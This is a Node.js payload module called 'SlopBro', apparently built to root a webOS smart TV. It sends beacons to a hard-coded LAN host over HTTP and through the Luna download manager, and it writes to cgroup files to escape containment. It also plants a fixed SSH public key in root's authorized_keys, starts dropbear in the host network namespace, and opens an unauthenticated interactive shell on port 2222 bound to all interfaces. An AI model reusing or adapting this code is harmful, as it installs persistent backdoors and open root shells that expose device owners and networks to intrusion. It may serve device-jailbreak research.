/* SlopBro - direct approach: skip HBC, deploy dropbear or TCP shell */
const child_process = require("child_process");
const fs = require("fs");
const net = require("net");
const http = require("http");

var DOWNLOAD_DIR = "/media/internal/downloads";
var LAPTOP = "192.168.1.35";
var PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJl8DuTS/qQhJz48HckvgS/M05bpjou6mI/7PnM/bQtB jef@tv-root";

// Module-level: runs when jsserver loads us (before run() is called).
// Log to the download dir too so it can be exfiltrated with
// com.webos.service.downloadmanager/upload if the network is jailed.
try {
  fs.writeFileSync(DOWNLOAD_DIR + "/loaded.marker",
    "loaded pid=" + process.pid + " node=" + process.version +
    " cwd=" + process.cwd() +
    " argv=" + JSON.stringify(process.argv) + "\n");
} catch(e) {}
// Probe fingerprint: lets a diagnostic page identify which jsserver argument
// layout actually managed to load this module.
try {
  var probeMatch = /probe-(\d+)/.exec(process.argv.join(" "));
  var probeTag = probeMatch ? ("probe-" + probeMatch[1]) : "default";
  fs.writeFileSync(DOWNLOAD_DIR + "/hit-" + probeTag + ".marker",
    "pid=" + process.pid + " node=" + process.version +
    " cwd=" + process.cwd() +
    " argv=" + JSON.stringify(process.argv) + "\n");
} catch(e) {}
try { fs.writeFileSync("/tmp/slopbro_loaded.txt", "loaded " + Date.now() + "\n"); } catch(e) {}
pingHttp("main_js_loaded");
// Also ping via luna download manager (bypasses network namespace isolation)
pingLuna("main_js_loaded_luna");

function log(msg) {
  var line = "[" + Date.now() + "] " + msg + "\n";
  try { fs.appendFileSync("/tmp/slopbro.log", line); } catch(e) {}
  try { fs.appendFileSync(DOWNLOAD_DIR + "/slopbro.log", line); } catch(e) {}
}

// Pure Node.js HTTP ping -- no exec, works if Node is in host network namespace
function pingHttp(tag) {
  try {
    http.get("http://" + LAPTOP + ":9999/" + encodeURIComponent(tag), function(res) {
      res.resume();
    }).on("error", function() {});
  } catch(e) {}
}

function pingLuna(tag) {
  try {
    child_process.spawn("/usr/bin/luna-send", [
      "-w", "5000", "-n", "1", "-a", "com.slopbro.root.service",
      "luna://com.webos.service.downloadmanager/download",
      JSON.stringify({
        target: "http://" + LAPTOP + ":9999/" + encodeURIComponent(tag),
        targetDir: "/tmp",
        targetFilename: "slopbro_ping_" + tag.slice(0, 20),
        subscribe: false
      })
    ], { detached: true, stdio: "ignore" }).unref();
  } catch(e) {}
}

function escapeCgroup() {
  var pid = process.pid.toString();
  [
    "/sys/fs/cgroup/cgroup.procs",
    "/sys/fs/cgroup/pids/cgroup.procs",
    "/sys/fs/cgroup/memory/cgroup.procs",
    "/sys/fs/cgroup/freezer/cgroup.procs"
  ].forEach(function(f) {
    try { fs.writeFileSync(f, pid); log("esc:" + f.replace(/.*\//, "")); }
    catch(e) { log("!esc:" + f.replace(/.*\//, "") + ":" + e.code); }
  });
}

function detach(cmd) {
  try {
    var p = child_process.spawn("/bin/sh", ["-c", cmd], {
      detached: true,
      stdio: "ignore"
    });
    p.unref();
    log("spawned: " + cmd.slice(0, 70));
    return true;
  } catch(e) {
    log("!spawn: " + e.message.slice(0, 50));
    return false;
  }
}

function toast(msg) {
  try {
    child_process.spawn("/usr/bin/luna-send", [
      "-w", "2000", "-n", "1", "-a", "com.webos.service.secondscreen.gateway",
      "luna://com.webos.notification/createToast",
      '{"sourceId":"com.webos.service.secondscreen.gateway","message":"' + msg.replace(/"/g, "'") + '"}'
    ], { detached: true, stdio: "ignore" }).unref();
  } catch(e) {}
}

function run() {
  log("run() v6 pid=" + process.pid + " node=" + process.version);
  pingHttp("run_started");
  pingLuna("run_started_luna");

  // Exec test: if this toast appears on screen, exec works
  try {
    child_process.execSync(
      "/usr/bin/luna-send -w 2000 -n 1" +
      " -a com.webos.service.secondscreen.gateway" +
      " luna://com.webos.notification/createToast" +
      " '{\"sourceId\":\"com.webos.service.secondscreen.gateway\",\"message\":\"SlopBro run() exec ok\"}'",
      { timeout: 4000 }
    );
    log("execSync toast ok");
    pingHttp("exec_toast_ok");
  } catch(e) {
    log("execSync toast fail: " + e.message.slice(0,50));
    pingHttp("exec_toast_fail");
  }

  // Cgroup escape (pure fs writes)
  escapeCgroup();
  pingHttp("after_cgroup_escape");

  // Install SSH authorized_keys (pure fs)
  ["/home/root/.ssh", "/root/.ssh", "/var/home/root/.ssh"].forEach(function(d) {
    try {
      fs.mkdirSync(d, { recursive: true, mode: 0o700 });
      fs.writeFileSync(d + "/authorized_keys", PUBKEY + "\n", { mode: 0o600 });
      log("key->" + d);
    } catch(e) { log("!key " + d + ": " + e.code); }
  });

  // Deploy dropbear from download dir to /tmp (pure fs write)
  var db = null;
  try {
    var dbSrc = DOWNLOAD_DIR + "/dropbear";
    var dbData = fs.readFileSync(dbSrc);
    fs.writeFileSync("/tmp/dropbear", dbData, { mode: 0o755 });
    db = "/tmp/dropbear";
    log("dropbear deployed to /tmp");
  } catch(e) {
    log("!deploy dropbear: " + e.message.slice(0, 50));
  }

  // Fallback: check system dropbear locations
  if (!db) {
    ["/usr/sbin/dropbear", "/usr/bin/dropbear"].forEach(function(p) {
      if (!db) { try { fs.accessSync(p, fs.constants.X_OK); db = p; } catch(e2) {} }
    });
  }

  log("db=" + db);
  pingHttp("db_" + (db ? "ready" : "missing"));

  if (db) {
    // nsenter into init network namespace, then start dropbear
    var dbCmd = "nsenter --net=/proc/1/ns/net -- " + db +
      " -R -E -F -p 2222 >>/tmp/dropbear.log 2>&1";
    var ok = detach(dbCmd);
    pingHttp("dropbear_nsenter_" + ok);

    if (!ok) {
      // Try without nsenter (might already be in host namespace)
      ok = detach(db + " -R -E -F -p 2222 >>/tmp/dropbear.log 2>&1");
      pingHttp("dropbear_direct_" + ok);
    }

    if (ok) { toast("SlopBro: dropbear :2222"); }
  }

  // autoroot.sh deliberately not spawned: it installs HBC and touches the
  // dev-mode bits, which conflicts with this TV's existing setup. Only the
  // SSH key + dropbear deployment above is needed.

  // Pure Node.js TCP shell — no exec needed for the listening server itself
  // Binds to all interfaces; reachable if Node is in host network namespace
  try {
    var srv = net.createServer(function(sock) {
      log("conn from " + sock.remoteAddress);
      pingHttp("tcp_conn");
      try {
        var sh = child_process.spawn("/bin/sh", ["-i"], {
          stdio: ["pipe", "pipe", "pipe"]
        });
        sock.pipe(sh.stdin);
        sh.stdout.pipe(sock);
        sh.stderr.pipe(sock);
        sock.on("close", function() { try { sh.kill(); } catch(e2) {} });
        sh.on("close", function() { try { sock.destroy(); } catch(e2) {} });
      } catch(e) {
        sock.write("# exec blocked: " + e.message.slice(0, 40) + "\n");
        sock.end();
      }
    });
    srv.on("error", function(e) {
      log("srv err: " + e.message);
      pingHttp("tcp_srv_err");
    });
    srv.listen(2222, "0.0.0.0", function() {
      var a = srv.address();
      log("tcp shell :2222 (" + a.address + ":" + a.port + ")");
      pingHttp("tcp_shell_up");
      toast("SlopBro: tcp shell :2222");
    });
    // NOT unref'd: keeps process alive while server is open
  } catch(e) {
    log("!net.createServer: " + e.message.slice(0, 40));
    pingHttp("tcp_create_failed");
  }

  log("run() done");
}

module.exports = { run: run };
